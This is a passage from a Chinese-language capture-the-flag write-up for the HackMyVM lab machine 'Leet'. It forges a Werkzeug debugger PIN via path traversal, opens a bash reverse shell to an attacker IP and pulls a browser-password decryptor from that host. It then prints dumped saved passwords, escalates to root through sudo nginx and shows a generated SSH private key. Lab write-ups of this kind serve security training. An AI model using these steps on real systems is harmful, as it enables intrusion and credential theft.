language-bash\"\u003e/download?filename=../proc/sys/kernel/random/boot_id\n23657fbb-d0b2-4bfa-9387-3d1cc930d11a\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e/download?filename=../proc/self/cgroup\n0::/system.slice/flaskapp.service\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e将值存储到各文件中\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"f6791f240ce6407ea271e86b78ac3bdb\"\u003c/span\u003e \u003e machine-id                               \n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"23657fbb-d0b2-4bfa-9387-3d1cc930d11a\"\u003c/span\u003e \u003e boot_id                                   \n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"0::/system.slice/flaskapp.service\"\u003c/span\u003e \u003e cgroup \n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emachine_id = b\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e filename \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"machine-id\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"boot_id\"\u003c/span\u003e:\n    try:\n        with open(filename, \u003cspan class=\"hljs-string\"\u003e\"rb\"\u003c/span\u003e) as f:\n            value = f.readline().strip()\n    except OSError:\n        \u003cspan class=\"hljs-built_in\"\u003econtinue\u003c/span\u003e\n\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e value:\n        machine_id += value\n        \u003cspan class=\"hljs-built_in\"\u003ebreak\u003c/span\u003e\ntry:\n    with open(\u003cspan class=\"hljs-string\"\u003e\"cgroup\"\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e\"rb\"\u003c/span\u003e) as f:\n        machine_id += f.readline().strip().rpartition(b\u003cspan class=\"hljs-string\"\u003e\"/\"\u003c/span\u003e)[2]\nexcept OSError:\n    pass\n\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(machine_id)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epython getID.py              \nb\u003cspan class=\"hljs-string\"\u003e'f6791f240ce6407ea271e86b78ac3bdbflaskapp.service'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e现在通过上面\u003ccode\u003egithub\u003c/code\u003e的脚本获得\u003ccode\u003ePIN\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003epython werkzeug-pin-bypass.py \nPin: 416-452-656\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e检验 PIN ，输入PIN后，成功进入\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMLeet/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e进行反弹 \u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eimport os;os.system(\u003cspan class=\"hljs-string\"\u003e\"/bin/bash -c 'bash -i \u003e\u0026#x26; /dev/tcp/192.168.56.4/1234 0\u003e\u0026#x26;1'\"\u003c/span\u003e)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMLeet/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e提权 - to riva\u003c/h2\u003e\n\u003ch3\u003emicro 提权\u003c/h3\u003e\n\u003cp\u003e查看权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@leet:/opt/project$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\n\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e www-data on leet:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin,\n    use_pty\n\nUser www-data may run the following commands on leet:\n    (riva) NOPASSWD: /usr/bin/micro\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e无需密码以 \u003ccode\u003eriva\u003c/code\u003e 身份执行\u003ccode\u003emicro\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003emicro\u003c/code\u003e 是一个基于终端的文本编辑器。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMLeet/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e这里使用编辑器要先将反弹 \u003ccode\u003eshell\u003c/code\u003e 升级\u003c/p\u003e\n\u003cp\u003e这里推荐：\u003ca href=\"https://www.bilibili.com/video/BV1qp4y1Z7Pv/\"\u003ehttps://www.bilibili.com/video/BV1qp4y1Z7Pv/\u003c/a\u003e | \u003ca href=\"https://www.cnblogs.com/sainet/p/15783539.html\"\u003ehttps://www.cnblogs.com/sainet/p/15783539.html\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMLeet/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们直接添加公钥，然后进行登录即可\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Leet ssh riva@192.168.56.47\nLinux leet.hmv 6.1.0-21-amd64 \u003cspan class=\"hljs-comment\"\u003e#1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64\u003c/span\u003e\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e each program are described \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the\nindividual files \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nriva@leet:~$ to root\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e提权 - to root\u003c/h2\u003e\n\u003ch3\u003e信息收集\u003c/h3\u003e\n\u003cp\u003e查看 \u003ccode\u003esudo\u003c/code\u003e 权限需要密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Leet ssh riva@192.168.56.47\nLinux leet.hmv 6.1.0-21-amd64 \u003cspan class=\"hljs-comment\"\u003e#1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64\u003c/span\u003e\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e each program are described \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the\nindividual files \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nriva@leet:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\n[\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e] password \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e riva: \nSorry, try again.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e读取 \u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eriva@leet:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt \n3a5cf7b35876169c280229c213ed63c1\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看 \u003ccode\u003eSUID\u003c/code\u003e 情况\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eriva@leet:/etc$ find / -perm -u=s -\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e f 2\u003e/dev/null\n/usr/lib/openssh/ssh-keysign\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/bin/mount\n/usr/bin/sudo\n/usr/bin/chsh\n/usr/bin/passwd\n/usr/bin/umount\n/usr/bin/gpasswd\n/usr/bin/newgrp\n/usr/bin/su\n/usr/bin/chfn\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eriva\u003c/code\u003e 用户家目录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eriva@leet:~$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al\ntotal 40\ndrwxr-xr-x 6 riva riva 4096 Feb 14  2024 .\ndrwxr-xr-x 3 root root 4096 Feb 14  2024 ..\nlrwxrwxrwx 1 riva riva    9 Feb 11  2024 .bash_history -\u003e /dev/null\n-rw-r--r-- 1 riva riva  220 Feb 14  2024 .bash_logout\n-rw-r--r-- 1 riva riva 3526 Feb 14  2024 .bashrc\ndrwxr-xr-x 3 riva riva 4096 Feb 14  2024 .config\ndrwxr-xr-x 3 riva riva 4096 Feb 14  2024 .\u003cspan class=\"hljs-built_in\"\u003elocal\u003c/span\u003e\ndrwx------ 4 riva riva 4096 Feb 14  2024 .mozilla\n-rw-r--r-- 1 riva riva  807 Feb 14  2024 .profile\ndrwx------ 2 riva riva 4096 Apr 21 14:25 .ssh\n-rwx------ 1 riva riva   33 Feb 14  2024 user.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003efirefox\u003c/h3\u003e\n\u003cp\u003e发现 \u003ccode\u003e.mozilla\u003c/code\u003e 说明存在 \u003ccode\u003efirefox\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e那么我们可以导出 \u003ccode\u003efirefox\u003c/code\u003e 中的密码（密码本里面保存的）\u003c/p\u003e\n\u003cp\u003e项目地址：\u003ca href=\"https://github.com/unode/firefox_decrypt\"\u003ehttps://github.com/unode/firefox_decrypt\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e克隆到 \u003ccode\u003eKali\u003c/code\u003e 中，然后拉取到靶机上\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eriva@leet:~$ wget 192.168.56.4:8081/firefox_decrypt.py\n--2025-04-21 14:49:19--  http://192.168.56.4:8081/firefox_decrypt.py\nConnecting to 192.168.56.4:8081... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 39405 (38K) [text/x-python]\nSaving to: ‘firefox_decrypt.py’\n\nfirefox_decrypt.py         100%[======================================\u003e]  38.48K  --.-KB/s    \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 0s      \n\n2025-04-21 14:49:19 (281 MB/s) - ‘firefox_decrypt.py’ saved [39405/39405]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e获取密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eriva@leet:~$ python3 firefox_decrypt.py \nSelect the Mozilla profile you wish to decrypt\n1 -\u003e zbznfk37.default\n2 -\u003e guu30cui.default-esr\n2\nWebsite:   chrome://FirefoxAccounts\nUsername: \u003cspan class=\"hljs-string\"\u003e'1db9561103ca4adc9afa6357c0a0b554'\u003c/span\u003e\nPassword: \u003cspan class=\"hljs-string\"\u003e'{\"version\":1,\"accountData\":{\"scopedKeys\":{\"https://identity.mozilla.com/apps/oldsync\":{\"kid\":\"1603273389635-IxsZ6HpGK9fL9tUfdcBqwA\",\"k\":\"Q8lFF-E91kvogabSQ2yjKj7k2JHX30UDeHEriaxaCY5slUVmtQvP-e3is5GxBiUKkG3g4dQLbFRsVOYeMkjNpg\",\"kty\":\"oct\"},\"sync:addon_storage\":{\"kid\":\"1603273389635-Ng9dJrdpVFqEoBs-R3LaTMKTiSWhWypqfmg9MJDby4U\",\"k\":\"L8MGJk3tWVlmN9Sm-MmdauxuQ38fIl--NziTjg_AmjO51_-vHo70OELMwif8kqn2zE3Yqg30BLw1ndNplRzGCA\",\"kty\":\"oct\"}},\"kSync\":\"43c94517e13dd64be881a6d2436ca32a3ee4d891d7df450378712b89ac5a098e6c954566b50bcff9ede2b391b106250a906de0e1d40b6c546c54e61e3248cda6\",\"kXCS\":\"231b19e87a462bd7cbf6d51f75c06ac0\",\"kExtSync\":\"2fc306264ded59596637d4a6f8c99d6aec6e437f1f225fbe3738938e0fc09a33b9d7ffaf1e8ef43842ccc227fc92a9f6cc4dd8aa0df404bc359dd369951cc608\",\"kExtKbHash\":\"360f5d26b769545a84a01b3e4772da4cc2938925a15b2a6a7e683d3090dbcb85\"}}'\u003c/span\u003e\n\nWebsite:   http://leet.hmv\nUsername: \u003cspan class=\"hljs-string\"\u003e'riva'\u003c/span\u003e\nPassword: \u003cspan class=\"hljs-string\"\u003e'PGH$2r0co3L5QL'\u003c/span\u003e\n\nWebsite:   https://hackmyvm.eu\nUsername: \u003cspan class=\"hljs-string\"\u003e'riva'\u003c/span\u003e\nPassword: \u003cspan class=\"hljs-string\"\u003e'lovelove80'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e经过测试 \u003ccode\u003ePGH$2r0co3L5QL\u003c/code\u003e ，是用户 \u003ccode\u003eriva\u003c/code\u003e 的密码。用户可以以 \u003ccode\u003eroot\u003c/code\u003e 权限执行 \u003ccode\u003enginx\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eriva@leet:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\n[\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e] password \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e riva: \nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e riva on leet:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser riva may run the following commands on leet:\n    (root) /usr/sbin/nginx\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们可以设置 \u003ccode\u003econfig\u003c/code\u003e 文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eriva@leet:/etc/nginx$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e /usr/sbin/nginx -h\nnginx version: nginx/1.22.1\nUsage: nginx [-?hvVtTq] [-s signal] [-p prefix]\n             [-e filename] [-c filename] [-g directives]\n\nOptions:\n  -?,-h         : this \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e\n  -v            : show version and \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e\n  -V            : show version and configure options \u003cspan class=\"hljs-keyword\"\u003ethen\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e\n  -t            : \u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e configuration and \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e\n  -T            : \u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e configuration, dump it and \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e\n  -q            : suppress non-error messages during configuration testing\n  -s signal     : send signal to a master process: stop, quit, reopen, reload\n  -p prefix     : \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e prefix path (default: /usr/share/nginx/)\n  -e filename   : \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e error \u003cspan class=\"hljs-built_in\"\u003elog\u003c/span\u003e file (default: stderr)\n  -c filename   : \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e configuration file (default: /etc/nginx/nginx.conf)\n  -g directives : \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e global directives out of configuration file\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e直接用脚本，项目地址：\u003ca href=\"https://github.com/DylanGrl/nginx_sudo_privesc\"\u003ehttps://github.com/DylanGrl/nginx_sudo_privesc\u003c/a\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eriva@leet:~$ vi exp.sh\nriva@leet:~$ \u003cspan class=\"hljs-built_in\"\u003echmod\u003c/span\u003e +x exp.sh\nriva@leet:~$ ./exp.sh\n[+] Creating configuration...\n[+] Loading configuration...\n[+] Generating SSH Key...\nGenerating public/private rsa key pair.\nEnter file \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ewhich\u003c/span\u003e to save the key (/home/riva/.ssh/id_rsa):\nEnter passphrase (empty \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e no passphrase):\nEnter same passphrase again:\nYour identification has been saved \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e /home/riva/.ssh/id_rsa\nYour public key has been saved \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e /home/riva/.ssh/id_rsa.pub\nThe key fingerprint is:\nSHA256:lZirJxXN1DzNc6FpZA9cwSb16ZcJfoloWJeBvEQN3NU riva@leet.hmv\nThe key\u003cspan class=\"hljs-string\"\u003e's randomart image is:\n+---[RSA 3072]----+\n|          ==*B=*+|\n|         * **=@oE|\n|        + *..Oo=.|\n|         +o.= + +|\n|        S. o o *.|\n|       o  .   . .|\n|      o .        |\n|       o         |\n|                 |\n+----[SHA256]-----+\n[+] Display SSH Private Key for copy...\n-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----\n[+] Add key to root user...\n[+] Use the SSH key to get access\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eriva@leet:~$ ssh root@127.0.0.1\nThe authenticity of host \u003cspan class=\"hljs-string\"\u003e'127.0.0.1 (127.0.0.1)'\u003c/span\u003e can\u003cspan class=\"hljs-string\"\u003e't be established.\nED25519 key fingerprint is SHA256:V0kY0pxHYgYYJeQXQGSoUclaPX71KqkFTnqjTNaj/Qk.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '\u003c/span\u003e127.0.0.1\u003cspan class=\"hljs-string\"\u003e' (ED25519) to the list of known hosts.\nLinux leet.hmv 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Tue May 28 17:37:49 2024 from 192.168.0.178\nroot@leet:~#\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@leet:~# \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e\nindex.html  r007_fl46.7x7  troll.jpg\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@leet:~# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e r007_fl46.7x7 \nca169772acb099a02ebab8da1d9070ea\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e题外话\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003etroll.jpg\u003c/code\u003e：\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMLeet/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eroot\u003c/code\u003e 家目录下还存在 \u003ccode\u003eindex.html\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@leet:~# \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e index.html \n\u0026#x3C;!DOCTYPE html\u003e\n\u0026#x3C;html lang=\u003cspan class=\"hljs-string\"\u003e\"fr\"\u003c/span\u003e\u003e\n\u0026#x3C;\u003cspan class=\"hljs-built_in\"\u003ehead\u003c/span\u003e\u003e\n    \u0026#x3C;meta charset=\u003cspan class=\"hljs-string\"\u003e\"UTF-8\"\u003c/span\u003e\u003e\n    \u0026#x3C;meta name=\u003cspan class=\"hljs-string\"\u003e\"viewport\"\u003c/span\u003e content=\u003cspan class=\"hljs-string\"\u003e\"width=device-width, initial-scale=1.0\"\u003c/span\u003e\u003e\n    \u0026#x3C;title\u003eImage centrée\u0026#x3C;/title\u003e\n\u0026#x3C;/head\u003e\n\u0026#x3C;body\u003e\n    \u0026#x3C;div style=\u003cspan class=\"hljs-string\"\u003e\"text-align: center;\"\u003c/span\u003e\u003e\n        \u0026#x3C;img src=\u003cspan class=\"hljs-string\"\u003e\"/root/troll.jpg\"\u003c/span\u003e alt=\u003cspan class=\"hljs-string\"\u003e\"Troll\"\u003c/span\u003e\u003e\n    \u0026#x3C;/div\u003e\n\u0026#x3C;/body\u003e\n\u0026#x3C;/html\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e……\u003c/p\u003e\n\u003cp\u003e一种方案（雾）就是让服务目录在 \u003ccode\u003e/root\u003c/code\u003e 中打开（应该很多人都是想这样做）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003euser root;\n\nevents {\n    worker_connections 1024;  \u003cspan class=\"hljs-comment\"\u003e# 设置每个 worker 的最大连接数\u003c/span\u003e\n}\n\nhttp {\n    server {\n        listen 8088;\n        server_name example.com;\n        \n        \u003cspan class=\"hljs-comment\"\u003e# 设置根目录\u003c/span\u003e\n        root /root;\n        index index.html index.htm;\n\n        location / {\n            try_files \u003cspan class=\"hljs-variable\"\u003e$uri\u003c/span\u003e \u003cspan class=\"hljs-variable\"\u003e$uri\u003c/span\u003e/ =404;\n        }\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e然后就是 \u003ccode\u003eLOL\u003c/code\u003e 突脸，实际上……(我也不知道为什么)\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMLeet/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e","title":"HackMyVM - Leet","date":"2025-04-21","updated":"2025-04-21","comments":true,"tags":["Linux靶机","HackMyVM","Nginx","Micro","Werkzeug"],"categories":"靶机","description":"Leet.\n\n https://hackmyvm.eu/machines/machine.php?vm=Leet\n \n\nNotes：Enjoy it.\n\n前期踩点\n\n\n\n\n\n\n\nWeb 渗透\n\n信息收集\n\n`7777` 是 web 端口\n\n\n\n看样子是一个 `Leet` 转换器：Leet，又称黑客语，是指一种发源于西方国家的BBS、在线游戏和黑客社群所使用的文字书写方式。通常是把拉丁字母转变成数字..."},"recentPosts":[{"id":"CyberstrikelabLab4","title":"Cyberstrikelab - Lab4","date":"2025-08-14","isEncrypted":false,"year":"2025","month":"08","day":"14"},{"id":"CyberstrikelabLab3","title":"Cyberstrikelab - Lab3","date":"2025-08-12","isEncrypted":false,"year":"2025","month":"08","day":"12"},{"id":"CyberstrikelabLab2","title":"Cyberstrikelab - Lab2","date":"2025-08-12","isEncrypted":false,"year":"2025","month":"08","day":"12"},{"id":"CyberstrikelabLab-1","title":"Cyberstrikelab - Lab1","date":"2025-08-12","isEncrypted":false,"year":"2025","month":"08","day":"12"},{"id":"HackTheBoxSeason8 - Cobblestone","title":"HackTheBox - Season8 - Cobblestone","date":"2025-08-11","isEncrypted":true,"year":"2025","month":"08","day":"11"},{"id":"TheHackersLabsShadowGate","title":"TheHackersLabs - ShadowGate","date":"2025-08-06","isEncrypted":false,"year":"2025","month":"08","day":"06"},{"id":"HackTheBoxSeason7-Code","title":"HackTheBox - Machine - Code","date":"2025-04-04","isEncrypted":false,"year":"2025","month":"08","day":"06"}]},"__N_SSG":true},"page":"/[year]/[month]/[day]/[id]","query":{"year":"2025","month":"04","day":"21","id":"HackMyVMLeet"},"buildId":"Cn2u-1XBPoyjEdHEI3G0H","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>